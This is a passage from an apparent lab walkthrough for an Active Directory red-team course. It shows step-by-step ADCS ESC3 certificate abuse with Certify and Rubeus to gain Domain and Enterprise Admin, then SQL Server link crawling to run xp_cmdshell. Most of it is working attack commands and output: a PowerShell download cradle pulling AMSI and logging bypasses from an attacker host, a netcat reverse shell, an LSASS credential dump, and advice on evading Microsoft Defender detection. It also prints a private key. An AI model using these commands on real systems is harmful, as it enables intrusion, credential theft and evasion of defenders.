                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Users
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 1
    Application Policies                  : Certificate Request Agent
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : CA-Integration
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
```

Now, request an Enrollment Agent Certificate from the template "SmartCardEnrollment-Agent"

* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent

```

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student731
[*] No subject name specified, using current context as subject.

[*] Template                : SmartCardEnrollment-Agent
[*] Subject                 : CN=student731, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 37

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAqWezM7mzY46y45ZJ5jrwu2fApbLwNKC4VlUSf5Uk8em09/XO
mXgqmdTlqmU8gImIoGhRc0Mwynsz9raBtqvg91BaJlTEvWC4xbAi2DZFBkCUj00J
3aHcVkyFWYzJFoCYOteEeN607feK1CEOSGcHl81dmkJmx4fWeDo5/53oHTqFkKpy
v9dTY8E4S20W4CyXE8G+5Jom94Oq8jRNU9zjwbLxG2yvQudmq0cVzEAwvI45UAVS
PlsqL4TEdtoNuf3x3Y1ofrw/1Nr24idQ5UZj4a4YHoExzcK45cMVjGFNvnp/rYHP
njyannXm2cpowSxr/UXeuc+JM6BaJBzTQnpX1QIDAQABAoIBAEmz3Up2065P6lKM
E3DAWfYfCLjOpiUve6PL9XVejSlW1a4/2nf4yQgOkTFWREFkFPY9DJrKM9MUUSJY
ewzfsMvIwMAGh2YhS6JupGpPCi7TMA88pDsx7av6NNYmI2LP5etL0s3Hjw4tcdAi
5ZTohmwsJDo2A4Nx/QRnyM4GhHMaSpT91tamzG1yFTZeqZ76MMlWOiKlxNrsrAao
HI5nz6/3RGtzWmiQJW8hBpx/W9vjfAImcGBdbFj6QozEKKN+cdudDAK4bf6KKiQf
GEG/zrXAo2rlC85A5/op/cgLvuaw7+YSd7Xf9l23z8u/onY6EXqa3aog7ZSostNz
JBD7160CgYEAxs73Y5PK3pWitNaBdR9I9Hlxg9fVOQEkgbhr6DGXy2uzvbWhWTcV
qo2Dq3SxPelLhJP1dKubSvsF23+xkiArlrPX/ManzNP6hwJiBY07Ka8GYzYKAFEF
96PTNAGv7KF9MF1tT2vuWVo6f7zMtPOafpFxxbTUbntYv/dIXSCBIF8CgYEA2iNa
ccJQUq9omyM37hc6ECAE3vylHVymAn14K+ax90Cuwprip3i/retD0ThpqIAJfOIu
GZPPjPpGS/Xr9wwmwi4b4pzTnC2vr/fSU9a+87jAtbqy4Aq2+ITMlmtjvCZfkpsE
6EVFWvBDyv4THSW5Sow12glLTTxd6LwEYiC3pEsCgYBtvbExdlN1qoO17vJnBG3x
BVhzvqAkZ00Pjg2Cjl2MHFeLUMdPx+hdzN/xtOhhlHXrKQFE9bUzHn2NPF94mel1
trBzB/V4S0rvW5FgHyWZTNPpz9qVciQpHnVnL8c8h6fjGq9MN/fJutSvzjfxasbN
NtvmlnrswYmr7YQ0Y8zjYQKBgQDTfAcJ12vsXic6kTB+YoJmc8SFM8gY6WQBcgd5
+JV9s3Y7MdKgrw6W3UrIorq9JDUOoHI1VfqZIWPZ7TiyMVO6Wt2qHIWEGz8DiW6e
3coPnIUpKzKUx46Q7p8zDjaJiWKLTkO5tL8C5YG0YhPB5Hr57WmgU/ZvkSEyrGZL
hJDGdQKBgBpRbwVIqZ0sWe8bNEeklk8Pk5p4dPkt5MYtJgZado+dfOr02fBvzqnL
Z0VDBgmyG+FMCTE21P6/oWfg32PSfn4giH+7+9qp6th3GmhGi1oFBy5mhZGq5AFT
Fl2GxG6mWs8rH/rZgYOUtkVJ22Wj5Cdn75fKHHsTcWsM0afHFxZu
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGWDCCBUCgAwIBAgITFQAAACUUE3y24XWb0gAAAAAAJTANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTA5MzAw
MDU3MjFaFw0yNzA5MzAwMTA3MjFaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NzMxMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqWezM7mzY46y45ZJ5jrwu2fApbLw
NKC4VlUSf5Uk8em09/XOmXgqmdTlqmU8gImIoGhRc0Mwynsz9raBtqvg91BaJlTE
vWC4xbAi2DZFBkCUj00J3aHcVkyFWYzJFoCYOteEeN607feK1CEOSGcHl81dmkJm
x4fWeDo5/53oHTqFkKpyv9dTY8E4S20W4CyXE8G+5Jom94Oq8jRNU9zjwbLxG2yv
Qudmq0cVzEAwvI45UAVSPlsqL4TEdtoNuf3x3Y1ofrw/1Nr24idQ5UZj4a4YHoEx
zcK45cMVjGFNvnp/rYHPnjyannXm2cpowSxr/UXeuc+JM6BaJBzTQnpX1QIDAQAB
o4IDBDCCAwAwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/guHdfLntDQIBZAIBBTAVBgNVHSUEDjAMBgorBgEEAYI3FAIBMA4G
A1UdDwEB/wQEAwIHgDAdBgkrBgEEAYI3FQoEEDAOMAwGCisGAQQBgjcUAgEwHQYD
VR0OBBYEFN/oeZzgW0Cyd9gKId7VH4S1IuylMB8GA1UdIwQYMBaAFNH+jQqn+rQy
nzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NO
PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1N
Q09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/
Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
b3JpdHkwQAYDVR0RBDkwN6A1BgorBgEEAYI3FAIDoCcMJXN0dWRlbnQ3MzFAZG9s
bGFyY29ycC5tb25leWNvcnAubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
AYI3GQIBoDAELlMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2ODg2
NDgtMjA2MTEwDQYJKoZIhvcNAQELBQADggEBAMOt7gWkjQNxxhimtXX1Zr16L2yH
2/UVMWEw6dggPuQaRGMC4Dy0XfO13ONgiI5d2yOkADJqptAOtGF59GtvZ8UbbIA2
jo/JzVK/I4Y7wE7Chj6MoRpc/mbmpolTVRe3wvjvgPc13zrhLq6zq1ozCwt80rGO
IM8rUo5c1y/nLiElUWrrSdYd+xkfgglAf1t9bfDKeoyAmbF7Lg7pNFyT/YzRvgKJ
1PQdm98pzj0IDetskUGQ1mWKneJGqzchHL7/89juQzBkpuD3cYwzWcSpmf+pJ5NY
QdRIxYbqC3J2hlRJRjw7gnRZbiD1j+55iLfeHQXg2qL5tbs5XBflfF4jOsA=
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Like earlier, save the certificate text to esc3.pem and convert to pfx. Let's keep using SecretPass@123 as 
the export password

* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx

Now we can use the Enrollment Agent Certificate to request a certificate for DA from the template 
SmartCardEnrollment-Users:

* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123

```
 v1.0.0
[*] Action: Request a Certificates
[*] Current user context : dcorp\student731
[*] Template : SmartCardEnrollment-Users
[*] On Behalf Of : dcorp\administrator
```

Once again, save the certificate text to esc3-DA.pem and convert the pem to pfx. Still using 
SecretPass@123 as the export password:

* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx

Use the esc3-DA created above with Rubeus to request a TGT for DA

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
```
[snip]
[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=studentx, CN=Users, 
DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 
'dollarcorp.moneycorp.local\administrator'
[+] TGT request successful!
```

Check if we actually have DA privileges now

* C:\AD\Tools>winrs -r:dcorp-dc cmd /c set username
```
USERNAME=administrator
```

To escalate to Enterprise Admin, we just need to make changes to request to the SmartCardEnrollment-Users template and Rubeus. Please note that we are using '/onbehalfof: mcorp\administrator' here

* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123

Convert the pem to esc3-EA.pfx using openssl and use the pfx with Rubeus

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator / certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt

Finally, access mcorp-dc!

* C:\AD\Tools> winrs -r:mcorp-dc cmd /c set username
``` 
USERNAME=administrator
``` 

### Learning Objective 22:
```
• Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
```

Let’s start with enumerating SQL servers in the domain and if studentx has privileges to connect to any 
of them. 
We can use PowerUpSQL module for that. Run the below command from a PowerShell session started using Invisi-Shell

* PS C:\AD\Tools\PowerUpSQL-master> Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```
VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.


ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1776
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student731
IsSysadmin             : No
ActiveSessions         : 1

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1776
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student731
IsSysadmin             : No
ActiveSessions         : 1
```

So, we can connect to dcorp-mssql. Using HeidiSQL client, let’s login to dcorp-mssql using windows 
authentication of studentx. After login, enumerate linked databases on dcorp-mssql

enumerate linked databases on dcorp-mssql

We can also use Get-SQLServerLinkCrawl for crawling the database links automatically:

* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MSSQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL
VERBOSE:  - Link Login: dcorp\student731
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-SQL1
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-SQL1
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
VERBOSE:  - Link Login: dblinkuser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-MGMT
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MGMT
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
VERBOSE:  - Link Login: sqluser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: EU-SQL37.EU.EUROCORP.LOCAL
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: EU-SQL37
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL37.EU.EUROCORP.LOCAL
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:


Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student731
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL37.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL37
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
User        : sa
Links       :
``` 

Sweet! We have sysadmin on eu-sql server!

If xp_cmdshell is enabled (or RPC out is true - which is set to false in this case), it is possible to execute commands on eu-sql using linked databases. 
To avoid dealing with a large number of quotes and escapes, we can use the following command

* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```
Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student731
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL37.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL37
CustomQuery : {USERNAME=SYSTEM, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

Create Invoke-PowerShellTcpEx.ps1:

Create a copy of Invoke-PowerShellTcp.ps1 and rename it to Invoke-PowerShellTcpEx.ps1.

Open Invoke-PowerShellTcpEx2.ps1 in PowerShell ISE (Right click on it and click Edit).

Add "Power -Reverse -IPAddress 172.16.100.31 -Port 443" (without quotes) to the end of the file.

Let's try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener

* C:\AD\Tools> C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.31/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.31/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.31/Invoke-PowerShellTcpEx2.ps1)"''' -QueryTarget eu-sql37
```
listening on [any] 443 ...
172.16.15.17: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.31] from (UNKNOWN) [172.16.15.17] 50509: NO_DATA
Windows PowerShell running as user SYSTEM on EU-SQL37
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
```

* PS C:\Windows\system32> $env:username
```
SYSTEM
```
* PS C:\Windows\system32> $env:computername
```
EU-SQL37
```

## Learning Objective 23:
```
• Compromise eu-sqlx again. Use opsec friendly alternatives to bypass MDE and MDI.
```

Continuing from the previous Learning Objective, we have ability to run commands as SYSTEM on eu-sql37.
This is perfect to leverage to perfrom an LSASS dump to further gain persistent credential access to the machine. 
To dump the memory of LSASS process, we can begin by leveraging minidumpdotnet as it is undetected by AV / MDE since it uses a custom implementation of the MiniDumpWriteDump() API call.

### Tools Transfer and Execution
Downloads over HTTP increase the chances of detection chained with other risky actions so we perfrom execution from an SMB share. We serve the minidumpdotnet and FindLSASSPID (to enumerate LSASS PID) on our studentVM share named - studentsharex (C:\AD\Tool\studentsharex). On the student VM, create an SMB share called - studentsharex with the following configuration: Allow Everyone ‘Read amd Write’ permissions on the share.

![alt text](image-51.png)

* C:\AD\Tools> copy C:\AD\Tools\minidumpdotnet.exe \\dcorp-student731\studentshare731
* C:\AD\Tools> copy C:\AD\Tools\FindLSASSPID.exe \\dcorp-student731\studentshare731

### LSASS DUMP using Custom APIs
Next, begin by performing SQL crawl xp_cmdshell execution on eu-sql37 to enumerate the LSASS PID 
using FindLSASSPID.exe. Start a PowerShell session using InvisiShell, import PowerUpSQL and run the 
following command

* C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\AD\Tools> Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student731.dollarcorp.moneycorp.local\studentshare731\FindLSASSPID.exe''' -QueryTarget eu-sql37
```
Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student731
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL37.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL37
CustomQuery : {The network path was not found., }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

To break a detection chain, we will run benign queries. In case of MDE, in our experience waiting for 
about 10 minutes also helps in avoiding detection.

* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql37

```
Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student731
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL37.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL37
CustomQuery : System.Data.DataRow
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

We can now perform an LSASS dump using the minidumpdotnet tool and save it to the studentshare731.
NOTE: Performing an LSASS dump directly on disk on eu-sql can cause the .dmp file to be corrupted as 
EDRs can sometimes mangle the .dmp file when written on disk.

* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-studentx.dollarcorp.moneycorp.local\studentsharex\minidumpdotnet.exe 712 \\dcorp-student731.dollarcorp.moneycorp.local\studentsharex731\monkeyx.dmp ''' -QueryTarget eu-sql37

```
Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student731
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL37.EU.EUROCORP.LOCAL}

